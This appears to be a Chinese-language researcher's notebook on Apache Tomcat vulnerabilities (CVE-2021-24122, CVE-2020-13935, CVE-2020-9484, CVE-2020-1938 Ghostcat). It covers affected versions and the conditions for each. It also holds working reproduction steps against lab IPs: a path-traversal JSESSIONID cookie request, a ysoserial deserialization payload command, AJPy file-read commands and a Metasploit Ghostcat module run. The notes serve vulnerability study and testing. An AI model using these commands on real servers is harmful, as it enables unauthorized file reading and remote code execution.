## Tomcat

安全公告：http://tomcat.apache.org/security.html
  http://tomcat.apache.org/security-7.html
  http://tomcat.apache.org/security-8.html
  http://tomcat.apache.org/security-9.html
  http://tomcat.apache.org/security-10.html

### Apache Tomcat 信息泄露漏洞 CVE-2021-24122 2020-11-11

影响：

Apache Tomcat 10.0.0-M1-10.0.0-M9

Apache Tomcat 9.0.0.M1-9.0.39

Apache Tomcat 8.5.0-8.5.59

Apache Tomcat 7.0.0-7.0.106

<https://fengchenzxc.github.io/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Tomcat/Apache%20Tomcat%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2021-24122/>

据官方描述，该漏洞由于Windows API（FindFirstFileW）与JRE API File.getCanonicalPath的一些意外行为所导致。

**当使用NTFS文件系统时，可以绕过一些安全限制，最终可导致如查看某些配置中JSP的源代码等危害。**

`getCanonicalPath()`

此路径方法返回绝对唯一的标准规范路径名。
此方法首先将此路径名转换为绝对形式，就像调用getAbsolutePath方法一样，然后以系统相关的方式将其映射到其唯一路径上。
也就是说如果路径中包含“.”或“..”等当前路径及上层路径表示法，则会从路径名中删除“.”和“..”使用真实路径代替。
另外比较重点的是 它还会解析软链接（在UNIX平台上）以及将驱动器号（在Microsoft Windows平台上），将它们转换为标准实际路径。
而 getCanonicalPath() 解析了软链接转换为实际路径导致漏洞的产生

### Tomcat websocket 拒绝服务漏洞利用代码披露（CVE-2020-13935）

条件：

1. 有ws功能，默认examples下面有
2. 版本小于 8.5.57 9.0.37 10.0.0-M7

危害： 服务器CPU百分百

https://github.com/RedTeamPentesting/CVE-2020-13935

### [APACHE TOMCAT SESSION 反序列化代码执行漏洞（CVE-2021-25329）通告](http://blog.nsfocus.net/cve-2021-25329/)

CVE-2020-9484 没有处理完

### Apache Tomcat Session 反序列化代码执行漏洞（CVE-2020-9484） (SCA:CVE-2020-9484)

1. 版本小于： 8.5.55/8.5.63 9.0.35/9.0.43 10.0.2

https://github.com/masahiro331/CVE-2020-9484
git clone https://github.com/masahiro331/CVE-2020-9484.git
docker build -t tomcat:CVE-2020-9484 .
docker run -d -p 8080:8080 tomcat:CVE-2020-9484

$ curl 'http://127.0.0.1:8080/index.jsp' -H 'Cookie: JSESSIONID=../../../../../usr/local/tomcat/groovy'

确认，在下面生成了 rce 文件
$ docker exec -it $CONTAINER /bin/sh
$ ls /tmp/rce

```bash
curl 'http://127.0.0.1:8080/index.jsp' -H 'Cookie: JSESSIONID=../../../../../usr/local/tomcat/groovy'
curl 'http://192.168.56.130:8080/index.jsp' -H 'Cookie: JSESSIONID=../../../../../tmp/123.txt'
```

https://github.com/masahiro331/CVE-2020-9484
https://github.com/IdealDreamLast/CVE-2020-9484

https://y4er.com/post/cve-2020-9484-tomcat-session-rce/

条件：
1. 不是默认配置，需要手动增加Context.xml
2. 文件上传 文件后缀需要是.session
3. 需要知道绝对路径来跨目录

扩展攻击 ，如果用redisSession进行持久化也是可以的

TODO：由于官方不认这个漏洞，看看是不是现在版本还可以攻击？

Tomcat Remote Code Execution via session persistence 分析【CVE-2020-9484】
http://www.lmxspace.com/2020/05/21/Tomcat-Remote-Code-Execution-via-session-persistence-%E5%88%86%E6%9E%90%E3%80%90CVE-2020-9484%E3%80%91/#0x05%E5%90%8E%E8%AF%9D

是用来生成 .session shell payload的

https://github.com/frohoff/ysoserial

```bash
mvn clean package -DskipTests
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 "touch /tmp/9484" > /tmp/22222.session
```

扩展：

[Java Deserialization Exploitation With Customized Ysoserial Payloads](https://rhinosecuritylabs.com/research/java-deserializationusing-ysoserial)

[Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100)

https://y4er.com/post/cve-2020-9484-tomcat-session-rce/

生成payload的原理：

[Java 反序列化： 基于 CommonsCollections4 的 Gadget 分析](https://paper.seebug.org/786/)

[Java反序列化漏洞的一些gadget](https://milkfr.github.io/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2019/08/22/analysis-java-deserialize-gadget-chain/)

这里是关于Tomcat默认不安全配置的session的另一个漏洞

tomcat使用了自带session同步功能时，不安全的配置（没有使用EncryptInterceptor）导致存在的反序列化漏洞，
通过精心构造的数据包， 可以对使用了tomcat自带session同步功能的服务器进行攻击。PS:这个不是CVE-2020-9484，9484是session持久化的洞，
这个是session集群同步的洞！

https://github.com/threedr3am/tomcat-cluster-session-sync-exp

[CVE-2020-9484 Tomcat-RCE漏洞分析报告](https://threedr3am.github.io/2020/06/12/CVE-2020-9484%20Tomcat-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/)

[Tomcat Session(CVE-2020-9484)反序列化漏洞复现](https://www.freebuf.com/vuls/245232.html)

攻击者可以控制服务器上的文件名/文件内容；
服务器上配置使用了PersistenceManager的FileStore；
PersistenceManager配置了sessionAttributeValueClassNameFilter值为“NULL”或者其他宽松的过滤器，使得攻击者可以提供反序列化对象；
攻击者知道FileStore使用的存储位置到可控文件的相对路径。

### ghostcat Tomcat-AJP 文件读取与包含漏洞（CVE-2020-1938） (SCA:ACSV-2020-022001)

AJP Connector，它使用的是 AJP 协议（Apache Jserv Protocol）是定向包协议。
因为性能原因，使用二进制格式来传输可读性文本，它能降低 HTTP 请求的处理成本，因此主要在需要集群、反向代理的场景被使用。

条件：

1. 打开8009，8.5.50前默认是打开8009的
2. 版本小于 8.5.51 9.0.31

[POC1](https://github.com/hypn0s/AJPy) 这个工具只针对这个CVE

```bash
wget https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.50/bin/apache-tomcat-8.5.50.tar.gz
tar xzf *.gz
python tomcat.py version 192.168.56.130
```

必须打开 8009才能直接使用，这个是直接获取的请求
python tomcat.py read_file --webapp=examples /WEB-INF/web.xml 192.168.56.130

不能获得
python tomcat.py read_file --webapp=examples /tmp/123.txt 192.168.56.130

这个好像拿到的和原文件不同
python tomcat.py read_file --webapp=examples /jsp/sessions/carts.jsp 192.168.56.130
cat ~/tomcat/apache-tomcat-8.5.50/webapps/examples/jsp/sessions/carts.jsp  

如果没有账号和密码，这个也取不到
python tomcat.py read_file --webapp=manager /WEB-INF/jsp/connectorTrustedCerts.jsp 192.168.56.130

下面这个应该是拿不到的
conf/tomcat-users.xml

[一文详解Tomcat Ghostcat-AJP协议文件读取/文件包含漏洞CVE-2020-1938](https://zhuanlan.zhihu.com/p/137527937)

成功
```bash
sudo msfconsole
search tomcat
use auxiliary/admin/http/tomcat_ghostcat
SET RHOSTS 192.168.56.130
SET RPORT 8009
run
```

[Apache Tomcat - AJP 'Ghostcat File Read/Inclusion](https://www.exploit-db.com/exploits/48143)

[xray 长亭科技 tomcat ghostcat 扫描](https://www.chaitin.cn/zh/ghostcat)

[CVE-2020-1938：Apache Tomcat服务器任意文件读取/包含漏洞通告](https://www.anquanke.com/post/id/199351)

[CVE-2020-1938 : Tomcat-Ajp 协议漏洞分析](https://www.anquanke.com/post/id/199448)

```xml
<Connector port="8080" protocol="HTTP/1.1"
             connectionTimeout="20000"
             redirectPort="8443" />
<Connector port="8009" protocol="AJP/1.3" redirectPort="8443" />
```